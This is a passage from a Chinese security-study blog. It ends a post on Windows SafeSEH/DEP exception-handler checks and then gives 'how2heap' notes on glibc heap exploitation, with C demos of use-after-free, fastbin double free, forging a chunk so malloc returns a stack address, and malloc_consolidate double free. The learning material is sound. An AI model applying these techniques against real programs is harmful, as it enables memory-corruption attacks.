(ExecuteDispatchEnable bit <span class="built_in">set</span> in the process flags) <span class="comment">//DEP是否开启</span></span><br><span class="line">            <span class="keyword">return</span> TRUE;                     </span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            raise ACCESS_VIOLATION;          </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (handler is <span class="keyword">not</span> in an image)          <span class="comment">// handler是否在未加载空间</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (ImageDispatchEnable bit <span class="built_in">set</span> in the process flags) <span class="comment">//设置的标志位是否允许</span></span><br><span class="line">            <span class="keyword">return</span> TRUE;                     </span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;                             /s/ 允许执行异常处理函数</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>代码中的ExecuteDispatchEnable和ImageDispatchEnable位标志是内核KPROCESS结构的一部分，这两个位用来控制当异常处理函数在不可以执行内存或者不在异常模块的映像（IMAGE）内时，是否执行异常处理函数。这两个位的值可以在运行时修改，不过默认情况下如果进程的DEP被关闭，则这两个位置1，如果进程的DEP是开启状态，则这两个位被置0。</p>
<p>通过源码我们可以看出，RtlIsValidHandler() 函数只会在以下几种情况执行异常处理函数</p>
<ul>
<li><p>在进程的DEP是开启的情况下</p>
<ul>
<li><p>异常处理函数和进程映像的SafeSEH表匹配且没有NO_SEH标志。</p>
</li>
<li><p>异常处理函数在进程映像的可执行页，并且没有NO_SEH标志，没有SafeSEH表，没有.NET的ILonly标志。</p>
</li>
</ul>
</li>
<li><p>在进程的DEP关闭的情况下</p>
<ul>
<li><p>异常处理函数和进程映像的SafeSEH表匹配没有NO_SEH标志。</p>
</li>
<li><p>异常处理函数在进程映像的可执行页，并且没有NO_SEH标志，没有SafeSEH表，没有.NET的ILonly标志。</p>
</li>
<li><p>异常处理函数不在当前进程的映像里面，但是不在当前线程的堆栈上。</p>
</li>
</ul>
</li>
</ul>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>看雪翻译小组 <a href="https://bbs.pediy.com/thread-226625.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-226625.htm</a></p>
<p>safeSEH笔记<a href="http://pstgroup.blogspot.com/2007/08/tipssafeseh.html" target="_blank" rel="noopener">http://pstgroup.blogspot.com/2007/08/tipssafeseh.html</a></p>
<p>DEP的保护原理<a href="http://netsecurity.51cto.com/art/201107/276497.htm" target="_blank" rel="noopener">http://netsecurity.51cto.com/art/201107/276497.htm</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/15/how2heap学习（1）/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Asa9ao">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Asa9ao">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/01/15/how2heap学习（1）/" itemprop="url">how2heap学习（1）</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-01-15T16:49:08+08:00">
                2019-01-15
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
                  <a href="/categories/pwn/" itemprop="url" rel="index">
                    <span itemprop="name">pwn</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>#how2heap</p>
<p>寒假了终于有大把大把的时间来集中学习了，自己也制定了计划，希望自己能坚持下来吧。how2heap是表哥推荐的，涵盖了很多知识点，寒假前段时间会系统的总结一下，相关题目的wp估计会另外开一个，这个权当是知识点的总结了，也是为了方便之后自己复习</p>
<p>还有一篇关于内存管理的文章相当不错，也放这里码着</p>
<p><a href="http://paper.seebug.org/papers/Archive/refs/heap/glibc%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86ptmalloc%E6%BA%90%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90.pdf" target="_blank" rel="noopener">http://paper.seebug.org/papers/Archive/refs/heap/glibc%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86ptmalloc%E6%BA%90%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90.pdf</a></p>
<h2 id="first-fit"><a href="#first-fit" class="headerlink" title="first_fit"></a>first_fit</h2><p>首先来看源码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This file doesn't demonstrate an attack, but shows the nature of glibc's allocator.\n"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"glibc uses a first-fit algorithm to select a free chunk.\n"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"If a chunk is free and large enough, malloc will select this chunk.\n"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This can be exploited in a use-after-free situation.\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating 2 buffers. They can be large, don't have to be fastbin.\n"</span>);</span><br><span class="line">    <span class="keyword">char</span>* a = <span class="built_in">malloc</span>(<span class="number">512</span>);</span><br><span class="line">    <span class="keyword">char</span>* b = <span class="built_in">malloc</span>(<span class="number">256</span>);</span><br><span class="line">    <span class="keyword">char</span>* c;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(512): %p\n"</span>, a);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd malloc(256): %p\n"</span>, b);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"we could continue mallocing here...\n"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"now let's put a string at a that we can read later \"this is A!\"\n"</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(a, <span class="string">"this is A!"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"first allocation %p points to %s\n"</span>, a, a);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing the first one...\n"</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We don't need to free anything again. As long as we allocate less than 512, it will end up at %p\n"</span>, a);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"So, let's allocate 500 bytes\n"</span>);</span><br><span class="line">    c = <span class="built_in">malloc</span>(<span class="number">500</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd malloc(500): %p\n"</span>, c);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"And put a different string here, \"this is C!\"\n"</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(c, <span class="string">"this is C!"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd allocation %p points to %s\n"</span>, c, c);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"first allocation %p points to %s\n"</span>, a, a);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"If we reuse the first allocation, it now holds the data from the third allocation."</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先是申请了两块内存，并让a、b分别指向它们，然后将a的内存空间存入字符串“this is A”，然后free了a，这里我们注意到，a的内存free了，但是a并没有被我们人为的改变指针的指向，a的指针目标仍然是之前的内存，即使已经free了。</p>
<p>然后我们又malloc了内存给了c，注意这里malloc的内存大小是小于a的。这里就会发生<strong>first-fit</strong>，简单的说，glibc在malloc时会检查free_chunk，当free_chunk的大小足够时，glibc会优先分配这个chunk，所以我们这里的c实际上也就是指向我们最开始分配的内存地址的。</p>
<p>接着将“this is C”给了c指向的内存，接着输出a、c，通过前面的解释我们已经知道了，a、c都应该会输出“this is C”</p>
<p>当我们分配了a、b后堆的情况如下所示</p>
<p><img src="https://ws2.sinaimg.cn/large/006tNc79ly1fz7dx2l9l6j30ei0g8q7h.jpg" alt="image-20190115171244727">1</p>
<p>继续运行可以看到a的内存地址里存储的内容</p>
<p><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fz7e09n3fcj30im02cjsc.jpg" alt="image-20190115171549866"></p>
<p>接着程序会free掉a，我们可以在unsortedbin里看到</p>
<p><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fz7e2ei9yjj30xi02qmym.jpg" alt="image-20190115171752114"></p>
<p>当我们malloc后，我们存入“this is c”，然后再次打印a指向的地址</p>
<p><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fz8habshuxj30ga032wfq.jpg" alt="image-20190116155445184"></p>
<p>结果和我们预测的一样。</p>
<h2 id="fastbin-dup"><a href="#fastbin-dup" class="headerlink" title="fastbin_dup"></a>fastbin_dup</h2><p>这个例子像我们展示了利用fastbin的free机制来实现double free</p>
<p>源码如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This file demonstrates a simple double-free attack with fastbins.\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating 3 buffers.\n"</span>);</span><br><span class="line">	<span class="keyword">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="keyword">int</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="keyword">int</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(8): %p\n"</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd malloc(8): %p\n"</span>, b);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd malloc(8): %p\n"</span>, c);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing the first one...\n"</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"If we free %p again, things will crash because %p is at the top of the free list.\n"</span>, a, a);</span><br><span class="line">	<span class="comment">// free(a);</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"So, instead, we'll free %p.\n"</span>, b);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now, we can free %p again, since it's not the head of the free list.\n"</span>, a);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we'll get %p twice!\n"</span>, a, b, a, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>程序首先分配了三块较小的内存，然后free了a，此时，a就会进入了fastbin中，且位于top。由于a是top，所以再次的free是不被允许的。此时list的状态如下(fastbin的chunk没有bk，而a的front为NULL)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">list = [0x602000&lt;-0x0]</span><br></pre></td></tr></table></figure>
<p>继续运行程序到b、c被free，同样进入了fastbin，c成为了top，而由于a不再是top，所以a可以再次被free</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">list = [0x602040-&gt;0x602020-&gt;0x602000&lt;-0x0]</span><br></pre></td></tr></table></figure>
<p>而当我们真正去再次free之后就会导致a再次成为top，这样就形成了一个环状结构</p>
<p>下面再次分配三个chunk，我们会发现第一个分配的还是0x602000，第二个则是0x602040，第三则是0x602020，完全符合之前的fastbin结构，程序到这里就结束了，但我们很好奇，如果继续malloc会发生什么呢？简单修改程序后我们再次运行</p>
<p><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fz8ibenyvrj30hg01kq37.jpg" alt="image-20190116163028130"></p>
<p>可以看到它分配的第四个chunk还是0x602000，也印证了我们刚才所说的环形结构，同时我们也知道了，假如我们有两个malloc的chunk分别是a、b，且通过double free使之形成类似的结构，当我们malloc a时，b成了fastbin的top，malloc b，a就成了fastbin的top，有种自动free的感觉。。。。</p>
<h2 id="fastbin-dup-into-stack"><a href="#fastbin-dup-into-stack" class="headerlink" title="fastbin_dup_into_stack"></a>fastbin_dup_into_stack</h2><p>实际上是在前面知识的基础上又近了一步，尝试去欺骗malloc返回一个我们可控区域的指针，还是先上源码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This file extends on fastbin_dup.c by tricking malloc into\n"</span></span><br><span class="line">	       <span class="string">"returning a pointer to a controlled location (in this case, the stack).\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> stack_var;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"The address we want malloc() to return is %p.\n"</span>, <span class="number">8</span>+(<span class="keyword">char</span> *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating 3 buffers.\n"</span>);</span><br><span class="line">	<span class="keyword">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="keyword">int</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="keyword">int</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(8): %p\n"</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd malloc(8): %p\n"</span>, b);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd malloc(8): %p\n"</span>, c);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing the first one...\n"</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"If we free %p again, things will crash because %p is at the top of the free list.\n"</span>, a, a);</span><br><span class="line">	<span class="comment">// free(a);</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"So, instead, we'll free %p.\n"</span>, b);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now, we can free %p again, since it's not the head of the free list.\n"</span>, a);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now the free list has [ %p, %p, %p ]. "</span></span><br><span class="line">		<span class="string">"We'll now carry out our attack by modifying data at %p.\n"</span>, a, b, a, a);</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *d = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(8): %p\n"</span>, d);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now the free list has [ %p ].\n"</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now, we have access to %p while it remains at the head of the free list.\n"</span></span><br><span class="line">		<span class="string">"so now we are writing a fake free size (in this case, 0x20) to the stack,\n"</span></span><br><span class="line">		<span class="string">"so that malloc will think there is a free chunk there and agree to\n"</span></span><br><span class="line">		<span class="string">"return a pointer to it.\n"</span>, a);</span><br><span class="line">	stack_var = <span class="number">0x20</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n"</span>, a);</span><br><span class="line">	*d = (<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>) (((<span class="keyword">char</span>*)&amp;stack_var) - <span class="keyword">sizeof</span>(d));</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd malloc(8): %p, putting the stack address on the free list\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"4th malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到之前的操作没变，都是先利用了double free使得fastbin呈现环状，此时的环应该是</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">list</span> = [<span class="number">0x602000</span>&lt;-&gt;<span class="number">0x602020</span>]</span><br></pre></td></tr></table></figure>
<p>后面的操作就很有意思了，先是malloc了两次，那第一个分配的就应该是0x602000，第二个就是0x602020，接着它就改了d的值，很显然修改的就是它的fd指针的值，那当我们再次malloc时，就会产生很神奇的情况：我们再次分配了0x602000，但是由于fd是stack，所以进入fastbin的成了stack而不是0x602020，环就被打破了，当我们再次malloc，我们就实现了malloc了stack的地址。</p>
<p><img src="https://ws2.sinaimg.cn/large/006tNc79ly1fz8j05x5j2j30ko02qmy7.jpg" alt="image-20190116165415679"></p>
<p><img src="https://ws2.sinaimg.cn/large/006tNc79ly1fz8j0ks84bj30g6020mxi.jpg" alt="image-20190116165439383"></p>
<p>可以看到情况确实和我们想的一样，原理就是这样了，再看看具体的实现细节。我们先是定义了一个局部变量，我们都知道局部变量是在栈上的，然后取地址，再让地址减去chunk的大小，这是为什么呢？我们之前的操作可以注意到，实际上malloc返回的并不是我们实际分配空间的起始部分，它跳过了chunk的固有信息（如size），直接从内容处开始，所以d作为一个指向内容的指针，我们同样需要把我们伪造的空间的内容部分给他，而这一部分在malloc的空间没有被实际的数据填充时，也就是fd指针。</p>
<p>还有一个问题是为什么stack变量要赋予0x20的初始值呢？这是为了伪造chunk的curSize部分，也就是我们常说的那3个bit的flag位，当然0x21也可以（0x21是理论上最正确的）</p>
<h2 id="fastbin-dup-consolidate"><a href="#fastbin-dup-consolidate" class="headerlink" title="fastbin_dup_consolidate"></a>fastbin_dup_consolidate</h2><p>源码如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">void</span>* p1 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">  <span class="keyword">void</span>* p2 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocated two fastbins: p1=%p p2=%p\n"</span>, p1, p2);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now free p1!\n"</span>);</span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span>* p3 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocated large bin to trigger malloc_consolidate(): p3=%p\n"</span>, p3);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"In malloc_consolidate(), p1 is moved to the unsorted bin.\n"</span>);</span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Trigger the double free vulnerability!\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We can pass the check in malloc() since p1 is not fast top.\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now p1 is in unsorted bin and fast bin. So we'will get it twice: %p %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">0x40</span>), <span class="built_in">malloc</span>(<span class="number">0x40</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先malloc了两次，分配的地址分别为0x602000、0x602050两个，接着free第一个，此时的fastbin即为</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">list</span> = [<span class="number">0x602000</span>]</span><br></pre></td></tr></table></figure>
<p>接着malloc了一个较大的内存空间，为0x6020b0，此时就是重点了。当glibc在分配一个large chunk时会检查是否存在fastbin，如果有的话，就会合并到unsortedbin中，再根据大小插入smallbin或者largebin，这就是所谓的consolidate。</p>
<p>此时bin的状态如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fastbin = []</span><br><span class="line">smallbin = [<span class="number">0x602000</span>]</span><br></pre></td></tr></table></figure>
<p>由于0x602000不再fastbin的top了，所以又可以free了，这样0x602000就又到了fastbin里了，接下来再malloc</p>
<p><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fz9volw1hhj30f80ektcr.jpg" alt="image-20190117205810704"></p>
<p>此时malloc先分配了fastbin中的0x602000，接着再malloc第二次</p>
<p><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fz9vp7x2wrj30ay0100ss.jpg" alt="image-20190117205859176"></p>
<p>可以看到分配还是0x602000，这次分配的实际上是我们的smallbin里的</p>
<h2 id="unsafe-unlink"><a href="#unsafe-unlink" class="headerlink" title="unsafe_unlink"></a>unsafe_unlink</h2><p>了解这个首先需要复习一下基础的知识了，首先回顾一下chunk的结构：</p>
<ul>
<li><p>当我们的chunk被分配之后</p>
